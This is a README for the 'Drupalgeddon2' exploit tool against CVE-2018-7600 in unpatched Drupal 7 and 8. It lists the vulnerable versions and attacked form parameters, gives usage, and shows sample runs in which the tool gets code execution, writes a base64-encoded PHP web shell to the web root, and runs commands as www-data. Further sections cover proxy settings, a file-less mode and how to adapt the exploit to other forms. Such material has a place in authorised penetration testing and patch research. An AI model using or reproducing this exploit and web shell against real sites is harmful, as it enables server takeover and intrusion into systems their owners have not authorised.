# CVE-2018-7600 | Drupal < 7.58 / 8.x < 8.3.9 / 8.4.x < 8.4.6 / 8.5.x < 8.5.1 - 'Drupalgeddon2' RCE (SA-CORE-2018-002)

[Drupalggedon2 ~ https://github.com/dreadlocked/Drupalgeddon2/](https://github.com/dreadlocked/Drupalgeddon2/) _([https://www.drupal.org/sa-core-2018-002](https://www.drupal.org/sa-core-2018-002))_

Supports:
- Drupal **< 8.3.9** / **< 8.4.6** / **< 8.5.1** ~ `user/register` URL, attacking `account/mail` & `#post_render` parameter, using PHP's `exec` function
- Drupal **< 7.58** ~ `user/password` URL, attacking `triggering_element_name` form & `#post_render` parameter, using PHP's `passthru` function
- With or without a writeable web root or sub-directories

The `user/register` method was chosen for Drupal v8.x, as it will return `HTTP 200`, and render the output in the `data` JSON response _(un-comment the code for `timezone`/`#lazy_builder` method, which will return `HTTP 500` & blind!)_ _([More Information](https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708))_.

Authors:
- [Hans Topo](https://github.com/dreadlocked)  _([@\_dreadlocked](https://twitter.com/_dreadlocked))_
- [g0tmi1k](https://blog.g0tmi1k.com/) _([@g0tmi1k](https://twitter.com/g0tmi1k))_


Ey! Before opening an issue, please, read the throubleshooting section at the end of this readme. Thanks!

- - -


## Usage:

```bash
$ ruby drupalgeddon2.rb
Usage: ruby drupalggedon2.rb <target>
       ruby drupalgeddon2.rb https://example.com
$
```


### Drupal v8.x Example

_Drupal v8.x < v8.3.9 / v8.4.x < v8.4.6 / v8.5.x < v8.5.1_

```bash
$ ./drupalgeddon2.rb http://localhost/drupal-8/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[*] Target : http://localhost/drupal-8/
--------------------------------------------------------------------------------
[!] MISSING: http://localhost/drupal-8/CHANGELOG.txt (404)
[+] Found  : http://localhost/drupal-8/core/CHANGELOG.txt (200)
[+] Drupal!: 8.4.5
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[*] Payload: echo MEWQTESC
[+] Result : MEWQTESC<span class="ajax-new-content"></span>
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: File Write To Web Root (./)
[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }<span class="ajax-new-content"></span>
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[*] Fake shell:   curl 'http://localhost/drupal-8/s.php' -d 'c=whoami'
ubuntu140045x64-drupal>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ubuntu140045x64-drupal>>
ubuntu140045x64-drupal>> uname -a
Linux ubuntu140045x64-drupal 3.13.0-144-generic #193-Ubuntu SMP Thu Mar 15 17:03:53 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
ubuntu140045x64-drupal>>
```


### Drupal v7.x Example

_Drupal < v7.58_

```
$ ./drupalgeddon2.rb http://localhost/drupal-7/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[*] Target : http://localhost/drupal-7/
--------------------------------------------------------------------------------
[+] Found  : http://localhost/drupal-7/CHANGELOG.txt (200)
[+] Drupal!: 7.55
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[*] Payload: echo FLUBCTEZ
[+] Result : FLUBCTEZ
[{"command":"settings","settings":{"basePath":"\/drupal-7.55\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"bSQXTLxvuTsh1M_vGKQog3Rp7ZAA-o8-PBVy0RpC5NY"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/drupal-7.55\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"bSQXTLxvuTsh1M_vGKQog3Rp7ZAA-o8-PBVy0RpC5NY"}}}]
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: File Write To Web Root (./)
[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }[{"command":"settings","settings":{"basePath":"\/drupal-7.55\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"5RvOux65dtisVX7T9EwnBxXhyvSdeNhX0njFg3ha_rc"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/drupal-7.55\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"5RvOux65dtisVX7T9EwnBxXhyvSdeNhX0njFg3ha_rc"}}}]
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[*] Fake shell:   curl 'http://localhost/drupal-7/s.php' -d 'c=whoami'
ubuntu140045x64-drupal>> uptime
 14:52:33 up 4 days,  3:35,  1 user,  load average: 0.00, 0.01, 0.05
ubuntu140045x64-drupal>>
ubuntu140045x64-drupal>> whoami
www-data
ubuntu140045x64-drupal>>
```


#### File-Less Method

If you do not want to even try and write a PHP web shell to the web server, edit the file as shown _(it will fall back if it can't find a writeable location anyway)_:

```ruby
writeshell = true
```


#### Proxy Support

For proxy support _(e.g. Burp)_, edit the file, replacing with your values. Example:

```ruby
proxy_addr = '192.168.0.130'
proxy_port = 8080
```


- - -


## Troubleshooting:

- Sometimes, websites may redirect to another path where Drupal exists (such as `30x` responses). Solution: Make sure you are using the correct Drupal path.
- Drupal v7.x - If `/user/password` form is disabled, maybe you should find another form, but remember to change the exploit. Solution: `form_id` parameter will change depending on the form used to exploit the vulnerability.
- If you cannot write a shell using drupalgeddon2.rb, use do-not-use.rb, this script doesn't write a shell to disk, and allows you to use whatever php method you want.


- - -


## Links:

- **Write up & Research** ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/
- Drupal SA-CORE-2018-002 Advisory ~ https://www.drupal.org/sa-core-2018-002
- cURL commands ~ https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708
- CVE ~ https://nvd.nist.gov/vuln/detail/CVE-2018-7600
